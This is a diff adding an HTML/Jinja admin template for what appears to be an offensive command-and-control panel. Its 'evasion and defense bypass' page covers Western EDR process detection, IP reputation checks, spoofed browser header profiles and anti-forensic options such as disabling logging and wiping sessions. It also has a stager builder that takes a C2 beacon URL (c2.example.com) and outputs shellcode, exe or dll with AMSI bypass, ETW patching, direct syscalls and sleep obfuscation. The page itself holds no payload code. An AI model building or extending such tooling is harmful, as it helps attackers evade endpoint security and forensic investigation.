@@ -1,0 +1,135 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="max-w-6xl mx-auto py-8 font-mono-brutal">
+  <!-- Navigation Back Link -->
+  <div class="mb-6 font-mono-brutal">
+    <a href="/" class="inline-flex items-center text-xs font-bold text-gray-700 dark:text-gray-300 hover:text-pure-black dark:hover:text-stark-white transition-colors">
+      <svg class="w-4 h-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M15 19l-7-7 7-7"/></svg>
+      [ BACK TO DASHBOARD ]
+    </a>
+  </div>
+
+  <header class="mb-8 border-b-4 border-pure-black pb-6">
+    <h1 class="text-4xl font-extrabold tracking-tight text-pure-black dark:text-stark-white mb-2">[ EVASION_&_DEFENSE_BYPASS_SETTINGS ]</h1>
+    <p class="text-sm text-brutal-red font-bold">&gt; Western EDR detection, IP Reputation filters, Browser Profiles, Anti-Forensics, & Hardened Stagers</p>
+  </header>
+
+  <div class="space-y-6">
+    <!-- Section A: EDR Detection -->
+    <div class="brutal-card p-6 space-y-4">
+      <h2 class="text-lg font-bold border-b-2 border-pure-black dark:border-stark-white pb-2 text-brutal-red">[ SECTION A: WESTERN EDR DETECTION ]</h2>
+      <div class="flex items-center gap-3">
+        <input type="checkbox" id="edr_toggle" checked class="w-5 h-5 border-2 border-pure-black checked:bg-brutal-red">
+        <label for="edr_toggle" class="font-bold text-sm">Enable Western EDR process detection</label>
+      </div>
+      <div>
+        <span class="text-xs font-bold block mb-2 text-gray-500">DETECTED EDR PROCESS LIST:</span>
+        <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2 text-xs font-mono">
+          {% for proc in edr_processes %}
+          <div class="p-1.5 border border-pure-black bg-off-white dark:bg-black font-bold text-brutal-red">
+            • {{ proc }}
+          </div>
+          {% endfor %}
+        </div>
+      </div>
+    </div>
+
+    <!-- Section B: IP Reputation -->
+    <div class="brutal-card p-6 space-y-4">
+      <h2 class="text-lg font-bold border-b-2 border-pure-black dark:border-stark-white pb-2 text-brutal-amber">[ SECTION B: IP REPUTATION & CATEGORIZATION ]</h2>
+      <form onsubmit="checkIpReputation(event)" class="space-y-3">
+        <div class="flex gap-3">
+          <input type="text" id="test_ip" value="{{ request.remote_addr }}" placeholder="8.8.8.8" class="flex-grow p-2.5 border-2 border-pure-black dark:border-stark-white bg-white dark:bg-black text-[var(--dj-fg)] font-mono text-xs">
+          <button type="submit" class="brutal-btn-black px-6 py-2 text-xs">[ TEST IP CATEGORY ]</button>
+        </div>
+      </form>
+      <pre id="ip-out" class="hidden bg-black text-emerald-400 p-3 font-mono text-[11px] border border-pure-black overflow-x-auto"></pre>
+    </div>
+
+    <!-- Section C: Browser Profiles -->
+    <div class="brutal-card p-6 space-y-4">
+      <h2 class="text-lg font-bold border-b-2 border-pure-black dark:border-stark-white pb-2 text-brutal-emerald">[ SECTION C: BROWSER HEADER PROFILES ]</h2>
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        {% for prof in header_profiles %}
+        <div class="p-3 border-2 border-pure-black bg-off-white dark:bg-black text-xs font-mono space-y-1">
+          <span class="font-bold uppercase text-brutal-emerald block">PROFILE #{{ loop.index }}</span>
+          <p class="truncate text-[10px] text-gray-500">UA: {{ prof.get('user_agent', '') }}</p>
+        </div>
+        {% endfor %}
+      </div>
+    </div>
+
+    <!-- Section D: Anti-Forensic Mode -->
+    <div class="brutal-card p-6 space-y-4">
+      <h2 class="text-lg font-bold border-b-2 border-pure-black dark:border-stark-white pb-2 text-pure-black dark:text-stark-white">[ SECTION D: ANTI-FORENSIC MODE ]</h2>
+      <div class="space-y-2 text-xs font-bold">
+        <label class="flex items-center gap-2 cursor-pointer">
+          <input type="checkbox" class="w-4 h-4 border-2 border-pure-black checked:bg-brutal-red">
+          Enable forensic-safe mode (disable body logging)
+        </label>
+        <label class="flex items-center gap-2 cursor-pointer">
+          <input type="checkbox" checked class="w-4 h-4 border-2 border-pure-black checked:bg-brutal-red">
+          Encrypt database credentials on disk
+        </label>
+        <label class="flex items-center gap-2 cursor-pointer">
+          <input type="checkbox" checked class="w-4 h-4 border-2 border-pure-black checked:bg-brutal-red">
+          Secure wipe session tokens on disconnect
+        </label>
+      </div>
+      <button onclick="if(confirm('Wipe all current active sessions?')) alert('All active sessions wiped.');" class="brutal-btn-red px-6 py-2 text-xs">[ WIPE ALL SESSIONS NOW ]</button>
+    </div>
+
+    <!-- Section E: Stager Evasion -->
+    <div class="brutal-card p-6 space-y-4">
+      <h2 class="text-lg font-bold border-b-2 border-pure-black dark:border-stark-white pb-2 text-brutal-red">[ SECTION E: STAGER EVASION GENERATOR ]</h2>
+      <form action="/admin/evasion/stager/build" method="POST" class="space-y-4">
+        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+          <div>
+            <label class="block text-xs font-bold mb-1">BEACON URL *</label>
+            <input type="url" name="beacon_url" required value="https://c2.example.com/beacon" class="w-full p-2.5 border-2 border-pure-black dark:border-stark-white bg-white dark:bg-black text-[var(--dj-fg)] font-mono text-xs">
+          </div>
+          <div>
+            <label class="block text-xs font-bold mb-1">STAGER FORMAT</label>
+            <select name="format" class="w-full p-2.5 border-2 border-pure-black dark:border-stark-white bg-white dark:bg-black text-[var(--dj-fg)]">
+              <option value="shellcode">Raw Shellcode (.bin)</option>
+              <option value="exe">Executable (.exe)</option>
+              <option value="dll">Dynamic Link Library (.dll)</option>
+            </select>
+          </div>
+        </div>
+        <div>
+          <span class="text-xs font-bold block mb-2">EVASION TECHNIQUES:</span>
+          <div class="flex flex-wrap gap-4 text-xs font-bold">
+            <label class="flex items-center gap-1.5"><input type="checkbox" name="techniques" value="amsi" checked> AMSI Bypass</label>
+            <label class="flex items-center gap-1.5"><input type="checkbox" name="techniques" value="etw" checked> ETW Patch</label>
+            <label class="flex items-center gap-1.5"><input type="checkbox" name="techniques" value="syscalls" checked> Direct Syscalls</label>
+            <label class="flex items-center gap-1.5"><input type="checkbox" name="techniques" value="sleep" checked> Sleep Obfuscation</label>
+          </div>
+        </div>
+        <button type="submit" class="brutal-btn-black px-6 py-2 text-xs">[ BUILD HARDENED STAGER ]</button>
+      </form>
+    </div>
+  </div>
+</div>
+
+<script>
+  async function checkIpReputation(e) {
+    e.preventDefault();
+    const out = document.getElementById('ip-out');
+    out.classList.remove('hidden');
+    out.textContent = "Checking IP reputation category...";
+    try {
+      const res = await fetch('/admin/evasion/ip-reputation', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ip: document.getElementById('test_ip').value })
+      });
+      const data = await res.json();
+      out.textContent = JSON.stringify(data, null, 2);
+    } catch (err) {
+      out.textContent = "Error: " + err;
+    }
+  }
+</script>
+{% endblock %}
